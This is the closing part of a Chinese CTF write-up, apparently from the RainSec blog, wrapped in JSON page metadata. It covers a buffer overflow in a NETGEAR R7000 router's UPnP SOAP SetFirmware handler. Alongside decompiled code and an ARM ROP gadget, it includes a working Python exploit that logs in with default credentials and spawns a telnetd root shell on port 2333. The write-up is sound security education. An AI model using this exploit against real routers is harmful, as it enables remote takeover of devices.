__int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">36</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">36</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">37</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    len <span class=\"token operator\">=</span> v7 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">38</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">39</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v10 <span class=\"token operator\">=</span> v8 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v6 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v13<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v13<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">calculate_checksum</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\n<span class=\"token comment\">/*\n.data:000841C8 ; specialArg ArgList[]\n.data:000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o\n.data:000841C8                                         ; sub_F39C+60↑o ...\n.data:000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r\n.data:000841CC                                         ; \"NewEnable\"\n.data:000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r\n.data:000841D4                 DCD 0xFF01\n.data:000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r\n.data:000841D8                                         ; \"NewConnectionType\"\n.data:000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r\n.data:000841E0                 DCD 0xFF02\n.data:000841E4                 DCD 0x4AB1C\n.data:000841E8                 DCD 0x40\n\n*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以在参数列表中找到该action的参数label为<code>&lt;NewFirmware&gt;FirmData&lt;/NewFirmware&gt;</code>；其中发送的firmData是base64加密过的，这里在构造firmware数据时注意<strong>不要造成memcpy的len太大</strong>否则在memcpy就可能出现段错误，但无法利用(这中copy函数的长度问题在iot中经常遇到)。构造包溢出后结果如下：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220211/image-20230313144816503.3oubbyer2o00.webp\"></p>\n<p>得到偏移如下：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230313144943910.71ixuw0w6dc0.webp\"></p>\n<p>因为开启了NX保护所以rop构造system(cmd)，在arm架构下控制r0~r3的gadgets很少，但是在程序中调用system函数的附近找到如下指令：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">2F134                 MOV             R0, SP  ; command\n2F138                 BL              system<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>那么就可以在176偏移处存放cmd，然后168处存放2F134地址即可。Exp如下：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys<span class=\"token punctuation\">,</span> base64<span class=\"token punctuation\">,</span> requests<span class=\"token punctuation\">,</span> struct\n\nURL <span class=\"token operator\">=</span> <span class=\"token string\">'http://localhost:5000/soap/server_sa'</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">SOAPLogin</span><span class=\"token punctuation\">(</span>http_username<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    header <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"SOAPACTION\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\"</span>\n    <span class=\"token punctuation\">}</span>\n    body <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;?xml version=\"1.0\"?&gt;\\r\\n'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">'&lt;Username&gt;admin&lt;/Username&gt;\\r\\n'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">'&lt;Password&gt;admin&lt;/Password&gt;\\r\\n'</span>\n\n    respnd <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>URL<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>body<span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> respnd<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">SetFirmware</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    header <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"SOAPACTION\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetFirmware\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>cookie<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span>\n    <span class=\"token punctuation\">}</span>\n    firmData <span class=\"token operator\">=</span> <span class=\"token string\">b'*#$^'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x00'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x00'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x01'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x00'</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">144</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'4'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r4</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'5'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r5</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'6'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r6</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'7'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r7</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'8'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r8</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'9'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r9</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span>      <span class=\"token comment\">#r10</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"ROP for system(ANY_cmd)\n    2F134                 MOV             R0, SP  ; command\n    2F138                 BL              system\n    \"\"\"</span>\n    firmData <span class=\"token operator\">+=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F134</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">#PC</span>\n    firmData <span class=\"token operator\">+=</span> <span class=\"token string\">b'/usr/sbin/telnetd -p2333 -l/bin/sh &amp;'</span>\n\n    body <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">b'&lt;s:Body&gt;\\r\\n'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">b'&lt;NewFirmware&gt;%s'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>firmData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">b'&lt;/NewFirmware&gt;'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">b'&lt;/s:Body&gt;\\r\\n'</span>\n    \n\n    respn <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>URL<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>body<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>respn<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    cookie <span class=\"token operator\">=</span> SOAPLogin<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span>\n    SetFirmware<span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><p>先了解一个程序的服务架构方便定位其易出问题的地方</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://blog.grimm-co.com/2022/04/no-hardware-no-problem-emulation-and.html\">No Hardware, No Problem: Emulation and Exploitation (grimm-co.com)</a></li>\n<li><a href=\"https://people.debian.org/~aurel32/qemu/armhf/\">Index of /~aurel32/qemu/armhf (debian.org)</a></li>\n</ul>\n","feature":true,"text":"西湖论剑WriteUP - Upnp前言这次应该是以一个NETGEAR R7000路由器的nDay为基础出的题，当时还在想是不是要挖上面的UPnP的0Day，没有意识到需要进行信息收集找相关漏洞分析。...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"CTF","slug":"CTF","count":2,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":2,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WriteUP-Upnp\"><span class=\"toc-text\">西湖论剑WriteUP - Upnp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D\"><span class=\"toc-text\">漏洞定位</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%80%86%E5%90%91\"><span class=\"toc-text\">逆向</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E9%81%8D%E5%8E%86\"><span class=\"toc-text\">服务遍历</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%88%B7%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">用户验证</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#login\"><span class=\"toc-text\">login</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A8%A1%E6%8B%9F%E5%90%AF%E5%8A%A8\"><span class=\"toc-text\">模拟启动</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Exploit\"><span class=\"toc-text\">Exploit</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93\"><span class=\"toc-text\">小结</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83\"><span class=\"toc-text\">参考</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从IP和样本进行拓线Hunting","uid":"770417add373829189d7a6ca63ee3b8d","slug":"从IP和样本进行拓线Hunting","date":"2023-05-25T10:38:45.000Z","updated":"2023-05-26T06:43:51.142Z","comments":true,"path":"api/articles/从IP和样本进行拓线Hunting.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220211/image.2ytx72zryfw0.png","text":"从IP和样本进行拓线Hunting前言在情报生产中当你拿到一批样本，应该思考如何通过样本里的C2或者特征去拓线找到更多的恶意样本或者C2链接，本文将给出从一个样本出发进行拓线分析的例子，大佬轻喷。 Q...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/categories/Hunting.json"}],"tags":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/tags/Hunting.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"手把手带你入门之用空间测绘Hunting C2","uid":"85cf47c5a6aa8aaa1697f3846792f828","slug":"Hunting C2","date":"2023-04-06T10:38:45.000Z","updated":"2023-05-26T06:24:57.560Z","comments":true,"path":"api/articles/Hunting C2.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/Shodan-filters-to-Hunt-Adversaries-Infrastructure-and-C2-min1.1q0ho87ttly8.jpg","text":"手把手带你入门之用空间测绘Hunting C2前言笔者最近工作接触到了情报方面，觉得蛮有意思的，就尝试通过空间测绘引擎来Hunting一些C2生产情报，觉得这个流程蛮有意思，开个新坑手把手带你情报入门...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/categories/Hunting.json"}],"tags":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/tags/Hunting.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}